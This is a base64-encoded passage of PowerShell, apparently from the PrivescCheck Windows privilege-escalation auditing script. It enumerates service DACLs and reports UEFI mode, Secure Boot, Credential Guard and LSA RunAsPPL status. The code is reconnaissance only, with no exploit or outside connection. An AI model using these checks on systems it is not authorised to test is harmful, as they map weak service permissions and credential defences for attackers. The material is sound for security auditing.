oIHVzaW5nIHRoZSBHZXRTZXJ2aWNlSGFuZGxlIFdpbjMyIEFQSSBjYWxsIGFuZCB0aGVuIHVzZXMKICAgIFF1ZXJ5U2VydmljZU9iamVjdFNlY3VyaXR5IHRvIHJldHJpZXZlIGEgY29weSBvZiB0aGUgc2VjdXJpdHkgZGVzY3JpcHRvciBmb3IgdGhlIHNlcnZpY2UuCgogICAgQGl0bTRuOiBJIGhhZCB0byBtYWtlIHNvbWUgc21hbGwgY2hhbmdlcyB0byB0aGUgb3JpZ2luYWwgY29kZSBiZWNhdXNlIGkgZG9uJ3QgaW1wb3J0IHRoZQogICAgV2luMzIgQVBJIGZ1bmN0aW9ucyB0aGUgc2FtZSB3YXkgaXQgd2FzIGRvbmUgaW4gUG93ZXJVcC4KCiAgICAuUEFSQU1FVEVSIE5hbWUKCiAgICBBbiBhcnJheSBvZiBvbmUgb3IgbW9yZSBzZXJ2aWNlIG5hbWVzIHRvIGFkZCBhIHNlcnZpY2UgRGFjbCBmb3IuIFBhc3NhYmxlIG9uIHRoZSBwaXBlbGluZS4KCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gR2V0LVNlcnZpY2UgfCBBZGQtU2VydmljZURhY2wKCiAgICBBZGQgRGFjbHMgZm9yIGV2ZXJ5IHNlcnZpY2UgdGhlIGN1cnJlbnQgdXNlciBjYW4gcmVhZC4KCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gR2V0LVNlcnZpY2UgLU5hbWUgVk1Ub29scyB8IEFkZC1TZXJ2aWNlRGFjbAoKICAgIEFkZCB0aGUgRGFjbCB0byB0aGUgVk1Ub29scyBzZXJ2aWNlIG9iamVjdC4KCiAgICAuT1VUUFVUUwoKICAgIFNlcnZpY2VQcm9jZXNzLlNlcnZpY2VDb250cm9sbGVyCgogICAgLkxJTksKCiAgICBodHRwczovL3JvaG5zcG93ZXJzaGVsbGJsb2cud29yZHByZXNzLmNvbS8yMDEzLzAzLzE5L3ZpZXdpbmctc2VydmljZS1hY2xzLwogICAgIz4KCiAgICBbT3V0cHV0VHlwZSgnU2VydmljZVByb2Nlc3MuU2VydmljZUNvbnRyb2xsZXInKV0KICAgIHBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeT0kVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtBbGlhcygnU2VydmljZU5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICAkTmFtZQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICBmaWx0ZXIgTG9jYWw6R2V0LVNlcnZpY2VSZWFkQ29udHJvbEhhbmRsZSB7CiAgICAgICAgICAgIFtPdXRwdXRUeXBlKFtJbnRQdHJdKV0KICAgICAgICAgICAgcGFyYW0gKAogICAgICAgICAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV0KICAgICAgICAgICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgICAgICAgICBbVmFsaWRhdGVTY3JpcHQoeyAkXyAtYXMgJ1NlcnZpY2VQcm9jZXNzLlNlcnZpY2VDb250cm9sbGVyJyB9KV0KICAgICAgICAgICAgICAgICRTZXJ2aWNlCiAgICAgICAgICAgICkKICAgICAgICAgICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uU2VydmljZVByb2Nlc3MgIyBTZXJ2aWNlUHJvY2VzcyBpcyBub3QgbG9hZGVkIGJ5IGRlZmF1bHQgIAogICAgICAgICAgICAkR2V0U2VydmljZUhhbmRsZSA9IFtTZXJ2aWNlUHJvY2Vzcy5TZXJ2aWNlQ29udHJvbGxlcl0uR2V0TWV0aG9kKCdHZXRTZXJ2aWNlSGFuZGxlJywgW1JlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXSAnSW5zdGFuY2UsIE5vblB1YmxpYycpCiAgICAgICAgICAgICRSZWFkQ29udHJvbCA9IDB4MDAwMjAwMDAKICAgICAgICAgICAgJFJhd0hhbmRsZSA9ICRHZXRTZXJ2aWNlSGFuZGxlLkludm9rZSgkU2VydmljZSwgQCgkUmVhZENvbnRyb2wpKQogICAgICAgICAgICAkUmF3SGFuZGxlCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2goJFNlcnZpY2VOYW1lIGluICROYW1lKSB7CgogICAgICAgICAgICAkSW5kaXZpZHVhbFNlcnZpY2UgPSBHZXQtU2VydmljZSAtTmFtZSAkU2VydmljZU5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgR2V0U2VydmljZUVycm9yCiAgICAgICAgICAgIGlmICgtbm90ICRHZXRTZXJ2aWNlRXJyb3IpIHsKCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRTZXJ2aWNlSGFuZGxlID0gR2V0LVNlcnZpY2VSZWFkQ29udHJvbEhhbmRsZSAtU2VydmljZSAkSW5kaXZpZHVhbFNlcnZpY2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAkU2VydmljZUhhbmRsZSA9ICROdWxsCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRTZXJ2aWNlSGFuZGxlIC1hbmQgKCRTZXJ2aWNlSGFuZGxlIC1uZSBbSW50UHRyXTo6WmVybykpIHsKICAgICAgICAgICAgICAgICAgICAkU2l6ZU5lZWRlZCA9IDAKCiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdCA9IFtQcml2ZXNjQ2hlY2suV2luMzJdOjpRdWVyeVNlcnZpY2VPYmplY3RTZWN1cml0eSgkU2VydmljZUhhbmRsZSwgW1NlY3VyaXR5LkFjY2Vzc0NvbnRyb2wuU2VjdXJpdHlJbmZvc106OkRpc2NyZXRpb25hcnlBY2wsIEAoKSwgMCwgW1JlZl0gJFNpemVOZWVkZWQpCiAgICAgICAgICAgICAgICAgICAgJExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQoKICAgICAgICAgICAgICAgICAgICAjIDEyMiA9PSBUaGUgZGF0YSBhcmVhIHBhc3NlZCB0byBhIHN5c3RlbSBjYWxsIGlzIHRvbyBzbWFsbAogICAgICAgICAgICAgICAgICAgIGlmICgoLW5vdCAkUmVzdWx0KSAtYW5kICgkTGFzdEVycm9yIC1lcSAxMjIpIC1hbmQgKCRTaXplTmVlZGVkIC1ndCAwKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkQmluYXJ5U2VjdXJpdHlEZXNjcmlwdG9yID0gTmV3LU9iamVjdCBCeXRlW10oJFNpemVOZWVkZWQpCgogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0ID0gW1ByaXZlc2NDaGVjay5XaW4zMl06OlF1ZXJ5U2VydmljZU9iamVjdFNlY3VyaXR5KCRTZXJ2aWNlSGFuZGxlLCBbU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5TZWN1cml0eUluZm9zXTo6RGlzY3JldGlvbmFyeUFjbCwgJEJpbmFyeVNlY3VyaXR5RGVzY3JpcHRvciwgJEJpbmFyeVNlY3VyaXR5RGVzY3JpcHRvci5Db3VudCwgW1JlZl0gJFNpemVOZWVkZWQpCiAgICAgICAgICAgICAgICAgICAgICAgICRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSYXdTZWN1cml0eURlc2NyaXB0b3IgPSBOZXctT2JqZWN0IFNlY3VyaXR5LkFjY2Vzc0NvbnRyb2wuUmF3U2VjdXJpdHlEZXNjcmlwdG9yIC1Bcmd1bWVudExpc3QgJEJpbmFyeVNlY3VyaXR5RGVzY3JpcHRvciwgMAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICREYWNsID0gJFJhd1NlY3VyaXR5RGVzY3JpcHRvci5EaXNjcmV0aW9uYXJ5QWNsIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFkZC1NZW1iZXIgLUlucHV0T2JqZWN0ICRfIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBBY2Nlc3NSaWdodHMgLVZhbHVlICQoW1ByaXZlc2NDaGVjay5XaW4zMitTZXJ2aWNlQWNjZXNzRmxhZ3NdICRfLkFjY2Vzc01hc2spIC1QYXNzVGhydQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFkZC1NZW1iZXIgLUlucHV0T2JqZWN0ICRJbmRpdmlkdWFsU2VydmljZSAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRGFjbCAtVmFsdWUgJERhY2wgLVBhc3NUaHJ1CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICROdWxsID0gW1ByaXZlc2NDaGVjay5XaW4zMl06OkNsb3NlU2VydmljZUhhbmRsZSgkU2VydmljZUhhbmRsZSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gR2V0LVVFRklTdGF0dXMgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEhlbHBlciAtIEdldHMgdGhlIEJJT1MgbW9kZSBvZiB0aGUgbWFjaGluZSAoTGVnYWN5IC8gVUVGSSkKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIEludm9rZXMgdGhlICJHZXRGaXJtd2FyZUVudmlyb25tZW50VmFyaWFibGUoKSIgZnVuY3Rpb24gZnJvbSB0aGUgV2luZG93cyBBUEkgd2l0aCBkdW1teSAKICAgIHBhcmFtZXRlcnMuIEluZGVlZCwgdGhlIHF1ZXJpZWQgdmFsdWUgZG9lc24ndCBtYXR0ZXIsIHdoYXQgbWF0dGVycyBpcyB0aGUgbGFzdCBlcnJvciBjb2RlLAogICAgd2hpY2ggeW91IGNhbiBnZXQgYnkgaW52b2tpbmcgIkdldExhc3RFcnJvcigpIi4gSWYgdGhlIHJldHVybiBjb2RlIGlzIEVSUk9SX0lOVkFMSURfRlVOQ1RJT04sCiAgICB0aGlzIG1lYW5zIHRoYXQgdGhlIGZ1bmN0aW9uIGlzIG5vdCBzdXBwb3J0ZWQgYnkgdGhlIEJJT1Mgc28gaXQncyBMRUdBQ1kuIE90aGVyd2lzZSwgdGhlIGVycm9yCiAgICBjb2RlIHdpbGwgaW5kaWNhdGUgdGhhdCBpdCBjYW5ub3QgZmluZCB0aGUgcmVxdWVzdGVkIHZhcmlhYmxlLCB3aGljaCBtZWFucyB0aGF0IHRoZSBmdW5jdGlvbiBpcwogICAgc3VwcG9ydGVkIGJ5IHRoZSBCSU9TIHNvIGl0J3MgVUVGSS4gCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBHZXQtQmlvc01vZGUKCiAgICBOYW1lIFN0YXR1cyBEZXNjcmlwdGlvbiAgICAgIAogICAgLS0tLSAtLS0tLS0gLS0tLS0tLS0tLS0KICAgIFVFRkkgICBUcnVlIEJJT1MgbW9kZSBpcyBVRUZJCiAgICAKICAgIC5OT1RFUwoKICAgIGh0dHBzOi8vZ2l0aHViLmNvbS94Y2F0Mi94Y2F0LWNvcmUvYmxvYi9tYXN0ZXIveENBVC1zZXJ2ZXIvc2hhcmUveGNhdC9uZXRib290L3dpbmRvd3MvZGV0ZWN0ZWZpLmNwcAogICAgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93aW4zMi9hcGkvd2luYmFzZS9uZi13aW5iYXNlLWdldGZpcm13YXJlZW52aXJvbm1lbnR2YXJpYWJsZWEKICAgIGh0dHBzOi8vZ2l0aHViLmNvbS9DaHJpc1dhcndpY2svR2V0VUVGSS9ibG9iL21hc3Rlci9HZXRGaXJtd2FyZUJJT1NvclVFRkkucHNtMQoKICAgICM+CgogICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbSgpCgogICAgJE9zVmVyc2lvbiA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbgoKICAgICMgV2luZG93cyA+PSA4LzIwMTIKICAgIGlmICgoJE9zVmVyc2lvbi5NYWpvciAtZ2UgMTApIC1vciAoKCRPc1ZlcnNpb24uTWFqb3IgLWdlIDYpIC1hbmQgKCRPc1ZlcnNpb24uTWlub3IgLWdlIDIpKSkgewoKICAgICAgICBbaW50XSRGaXJtd2FyZVR5cGUgPSAwCiAgICAgICAgJFJlc3VsdCA9IFtQcml2ZXNjQ2hlY2suV2luMzJdOjpHZXRGaXJtd2FyZVR5cGUoW3JlZl0kRmlybXdhcmVUeXBlKQogICAgICAgICRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKCiAgICAgICAgaWYgKCRSZXN1bHQgLWd0IDApIHsKICAgICAgICAgICAgaWYgKCRGaXJtd2FyZVR5cGUgLWVxIDEpIHsKICAgICAgICAgICAgICAgICMgRmlybXdhcmVUeXBlQmlvcyA9IDEKICAgICAgICAgICAgICAgICRTdGF0dXMgPSAkRmFsc2UgCiAgICAgICAgICAgICAgICAkRGVzY3JpcHRpb24gPSAiQklPUyBtb2RlIGlzIExlZ2FjeSIKICAgICAgICAgICAgfSBlbHNlaWYgKCRGaXJtd2FyZVR5cGUgLWVxIDIpIHsKICAgICAgICAgICAgICAgICMgRmlybXdhcmVUeXBlVWVmaSA9IDIKICAgICAgICAgICAgICAgICRTdGF0dXMgPSAkVHJ1ZSAKICAgICAgICAgICAgICAgICREZXNjcmlwdGlvbiA9ICJCSU9TIG1vZGUgaXMgVUVGSSIKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICREZXNjcmlwdGlvbiA9ICJCSU9TIG1vZGUgaXMgdW5rbm93biIKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJExhc3RFcnJvcikKICAgICAgICB9CgogICAgIyBXaW5kb3dzID0gNy8yMDA4IFIyCiAgICB9IGVsc2VpZiAoKCRPc1ZlcnNpb24uTWFqb3IgLWVxIDYpIC1hbmQgKCRPc1ZlcnNpb24uTWlub3IgLWVxIDEpKSB7CgogICAgICAgIFtQcml2ZXNjQ2hlY2suV2luMzJdOjpHZXRGaXJtd2FyZUVudmlyb25tZW50VmFyaWFibGUoIiIsICJ7MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwfSIsIFtJbnRQdHJdOjpaZXJvLCAwKSB8IE91dC1OdWxsIAogICAgICAgICRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgIAogICAgICAgICRFUlJPUl9JTlZBTElEX0ZVTkNUSU9OID0gMQogICAgICAgIGlmICgkTGFzdEVycm9yIC1lcSAkRVJST1JfSU5WQUxJRF9GVU5DVElPTikgewogICAgICAgICAgICAkU3RhdHVzID0gJEZhbHNlIAogICAgICAgICAgICAkRGVzY3JpcHRpb24gPSAiQklPUyBtb2RlIGlzIExlZ2FjeSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yKQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRTdGF0dXMgPSAkVHJ1ZSAKICAgICAgICAgICAgJERlc2NyaXB0aW9uID0gIkJJT1MgbW9kZSBpcyBVRUZJIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlIChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpCiAgICAgICAgfQogICAgICAgIAogICAgfSBlbHNlIHsKICAgICAgICAkRGVzY3JpcHRpb24gPSAiQ2Fubm90IGNoZWNrIEJJT1MgbW9kZSIKICAgIH0KCiAgICAkQmlvc01vZGUgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdAogICAgJEJpb3NNb2RlIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTmFtZSIgLVZhbHVlICJVRUZJIgogICAgJEJpb3NNb2RlIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiU3RhdHVzIiAtVmFsdWUgJFN0YXR1cwogICAgJEJpb3NNb2RlIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiRGVzY3JpcHRpb24iIC1WYWx1ZSAkRGVzY3JpcHRpb24KICAgICRCaW9zTW9kZQp9CgpmdW5jdGlvbiBHZXQtU2VjdXJlQm9vdFN0YXR1cyB7CiAgICA8IwogICAgLlNZTk9QU0lTCiAgICAKICAgIEhlbHBlciAtIEdldCB0aGUgc3RhdHVzIG9mIFNlY3VyZSBCb290IChlbmFibGVkL2Rpc2FibGVkL3Vuc3VwcG9ydGVkKQoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgSW4gY2FzZSBvZiBhIFVFRkkgQklPUywgeW91IGNhbiBjaGVjayB3aGV0aGVyICdTZWN1cmUgQm9vdCcgaXMgZW5hYmxlZCBieSBsb29raW5nIGF0IHRoZSAKICAgICdVRUZJU2VjdXJlQm9vdEVuYWJsZWQnIHZhbHVlIG9mIHRoZSBmb2xsb3dpbmcgcmVnaXN0cnkga2V5OiAnSEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50CiAgICBDb250cm9sU2V0XENvbnRyb2xcU2VjdXJlQm9vdFxTdGF0ZScuIAogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gR2V0LVNlY3VyZUJvb3RTdGF0dXMKCiAgICBOYW1lICAgICAgICBTdGF0dXMgRGVzY3JpcHRpb24KICAgIC0tLS0gICAgICAgIC0tLS0tLSAtLS0tLS0tLS0tLQogICAgU2VjdXJlIEJvb3QgICBUcnVlIFNlY3VyZSBCb290IGlzIGVuYWJsZWQKCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXVBhcmFtKCkKCiAgICAkUmVnUGF0aCA9ICJIS0VZX0xPQ0FMX01BQ0hJTkVcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcU2VjdXJlQm9vdFxTdGF0ZSIKICAgICRSZXN1bHQgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICJSZWdpc3RyeTo6JCgkUmVnUGF0aCkiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1FcnJvclZhcmlhYmxlIEdldEl0ZW1Qcm9wZXJ0eUVycm9yIAoKICAgIGlmICgtbm90ICRHZXRJdGVtUHJvcGVydHlFcnJvcikgewoKICAgICAgICBpZiAoLW5vdCAoJE51bGwgLWVxICRSZXN1bHQuVUVGSVNlY3VyZUJvb3RFbmFibGVkKSkgewoKICAgICAgICAgICAgaWYgKCRSZXN1bHQuVUVGSVNlY3VyZUJvb3RFbmFibGVkIC1lcSAxKSB7CiAgICAgICAgICAgICAgICAkU3RhdHVzID0gJFRydWUKICAgICAgICAgICAgICAgICREZXNjcmlwdGlvbiA9ICJTZWN1cmUgQm9vdCBpcyBlbmFibGVkIgogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJFN0YXR1cyA9ICRGYWxzZQogICAgICAgICAgICAgICAgJERlc2NyaXB0aW9uID0gIlNlY3VyZSBCb290IGlzIGRpc2FibGVkIgogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJFN0YXR1cyA9ICRGYWxzZQogICAgICAgICAgICAkRGVzY3JpcHRpb24gPSAiU2VjdXJlIEJvb3QgaXMgbm90IHN1cHBvcnRlZCIKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgICRTdGF0dXMgPSAkRmFsc2UKICAgICAgICAkRGVzY3JpcHRpb24gPSAiU2VjdXJlIEJvb3QgaXMgbm90IHN1cHBvcnRlZCIKICAgIH0KCiAgICAkU2VjdXJlQm9vdFN0YXR1cyA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0CiAgICAkU2VjdXJlQm9vdFN0YXR1cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk5hbWUiIC1WYWx1ZSAiU2VjdXJlIEJvb3QiCiAgICAkU2VjdXJlQm9vdFN0YXR1cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlN0YXR1cyIgLVZhbHVlICRTdGF0dXMKICAgICRTZWN1cmVCb290U3RhdHVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiRGVzY3JpcHRpb24iIC1WYWx1ZSAkRGVzY3JpcHRpb24KICAgICRTZWN1cmVCb290U3RhdHVzCn0KCmZ1bmN0aW9uIEdldC1DcmVkZW50aWFsR3VhcmRTdGF0dXMgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEhlbHBlciAtIEdldHMgdGhlIHN0YXR1cyBvZiBXaW5kb3dzIERlZmVuZGVyIENyZWRlbnRpYWwgR3VhcmQgCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBHZXRzIHRoZSBzdGF0dXMgb2YgdGhlIENyZWRlbnRpYWwgR3VhcmQgYnkgcmVhZGluZyB0aGUgJ0xzYUNmZ0ZsYWdzJyB2YWx1ZSBvZiB0aGUgZm9sbG93aW5nIAogICAgcmVnaXN0cnkga2V5OiAnSEtFWV9MT0NBTF9NQUNISU5FXFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXExTQScuIFBvc3NpYmxlIHZhbHVlcyBhcmU6CiAgICBOb25lPT5Ob3QgY29uZmlndXJlZCwgMD0+RGlzYWJsZWQsIDE9PkVuYWJsZWQgd2l0aCBVRUZJIGxvY2ssIDI9PkRpc2FibGVkIHdpdGhvdXQgVUVGSSBsb2NrLgogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gR2V0LUNyZWRlbnRpYWxHdWFyZFN0YXR1cwoKICAgIE5hbWUgICAgICAgICAgICAgU3RhdHVzIERlc2NyaXB0aW9uCiAgICAtLS0tICAgICAgICAgICAgIC0tLS0tLSAtLS0tLS0tLS0tLQogICAgQ3JlZGVudGlhbCBHdWFyZCAgRmFsc2UgQ3JlZGVudGlhbCBHdWFyZCBpcyBub3QgY29uZmlndXJlZAogICAgCiAgICAuTElOSwoKICAgIGh0dHBzOi8vZG9jcy5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3Mvc2VjdXJpdHkvaWRlbnRpdHktcHJvdGVjdGlvbi9jcmVkZW50aWFsLWd1YXJkL2NyZWRlbnRpYWwtZ3VhcmQtbWFuYWdlCgogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbSgpCgogICAgJE9zVmVyc2lvbiA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbgoKICAgIGlmICgkT3NWZXJzaW9uLk1ham9yIC1nZSAxMCkgewogICAgICAgIAogICAgICAgIGlmICgoKEdldC1Db21wdXRlckluZm8pLkRldmljZUd1YXJkU2VjdXJpdHlTZXJ2aWNlc0NvbmZpZ3VyZWQpIC1tYXRjaCAnQ3JlZGVudGlhbEd1YXJkJykgewoKICAgICAgICAgICAgJFN0YXR1cyA9ICRGYWxzZQogICAgICAgICAgICAkRGVzY3JpcHRpb24gPSAiQ3JlZGVudGlhbCBHdWFyZCBpcyBjb25maWd1cmVkIGJ1dCBpcyBub3QgcnVubmluZyIKCiAgICAgICAgICAgIGlmICgoKEdldC1Db21wdXRlckluZm8pLkRldmljZUd1YXJkU2VjdXJpdHlTZXJ2aWNlc1J1bm5pbmcpIC1tYXRjaCAnQ3JlZGVudGlhbEd1YXJkJykgewogICAgICAgICAgICAgICAgJFN0YXR1cyA9ICRUcnVlCiAgICAgICAgICAgICAgICAkRGVzY3JpcHRpb24gPSAiQ3JlZGVudGlhbCBHdWFyZCBpcyBjb25maWd1cmVkIGFuZCBydW5uaW5nIgogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJFN0YXR1cyA9ICRGYWxzZQogICAgICAgICAgICAkRGVzY3JpcHRpb24gPSAiQ3JlZGVudGlhbCBHdWFyZCBpcyBub3QgY29uZmlndXJlZCIKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgICRTdGF0dXMgPSAkRmFsc2UKICAgICAgICAkRGVzY3JpcHRpb24gPSAiQ3JlZGVudGlhbCBHdWFyZCBpcyBub3Qgc3VwcG9ydGVkIG9uIHRoaXMgT1MiCiAgICB9CgogICAgJENyZWRlbnRpYWxHdWFyZFN0YXR1cyA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0CiAgICAkQ3JlZGVudGlhbEd1YXJkU3RhdHVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTmFtZSIgLVZhbHVlICJDcmVkZW50aWFsIEd1YXJkIgogICAgJENyZWRlbnRpYWxHdWFyZFN0YXR1cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlN0YXR1cyIgLVZhbHVlICRTdGF0dXMKICAgICRDcmVkZW50aWFsR3VhcmRTdGF0dXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJEZXNjcmlwdGlvbiIgLVZhbHVlICREZXNjcmlwdGlvbgogICAgJENyZWRlbnRpYWxHdWFyZFN0YXR1cwp9CgpmdW5jdGlvbiBHZXQtTHNhUnVuQXNQUExTdGF0dXMgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEhlbHBlciAtIEdldHMgdGhlIHN0YXR1cyBvZiBSdW5Bc1BQTCBvcHRpb24gZm9yIExTQQoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgUnVuQXNQUEwgY2FuIGJlIGVuYWJsZWQgZm9yIHRoZSBMU0EgcHJvY2VzcyBpbiB0aGUgcmVnaXN0cnkuIElmIGl0J3MgZW5hYmxlZCBhbmQgdGhlIGRldmljZSBoYXMKICAgIFNlY3VyZSBCb290IG9yIFVFRkksIHRoaXMgc2V0dGluZyBpcyBzdG9yZWQgaW4gdGhlIFVFRkkgZmlybXdhcmUgc28gcmVtb3ZpbmcgdGhlIHJlZ2lzdHJ5IGtleSAKICAgIHdvbid0IGRpc2FibGUgdGhpcyBzZXR0aW5nLiAKICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEdldC1Mc2FSdW5Bc1BQTFN0YXR1cwogICAgCiAgICBOYW1lICAgICBTdGF0dXMgRGVzY3JpcHRpb24gICAgICAgIAogICAgLS0tLSAgICAgLS0tLS0tIC0tLS0tLS0tLS0tCiAgICBSdW5Bc1BQTCAgIFRydWUgUnVuQXNQUEwgaXMgZW5hYmxlZAogICAgCiAgICAuTElOSwoKICAgIGh0dHBzOi8vZG9jcy5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3Mtc2VydmVyL3NlY3VyaXR5L2NyZWRlbnRpYWxzLXByb3RlY3Rpb24tYW5kLW1hbmFnZW1lbnQvY29uZmlndXJpbmctYWRkaXRpb25hbC1sc2EtcHJvdGVjdGlvbgogICAgIz4KICAgIAoKICAgIFtDbWRsZXRCaW5kaW5nKCldUGFyYW0oKQoKICAgICRPc1ZlcnNpb24gPSBbU3lzdGVtLkVudmlyb25tZW50XTo6T1NWZXJzaW9uLlZlcnNpb24KCiAgICAjIGlmIFdpbmRvd3MgPj0gOC4xIC8gMjAxMiBSMgogICAgaWYgKCRPc1ZlcnNpb24uTWFqb3IgLWVxIDEwIC1vciAoICgkT3NWZXJzaW9uLk1ham9yIC1lcSA2KSAtYW5kICgkT3NWZXJzaW9uLk1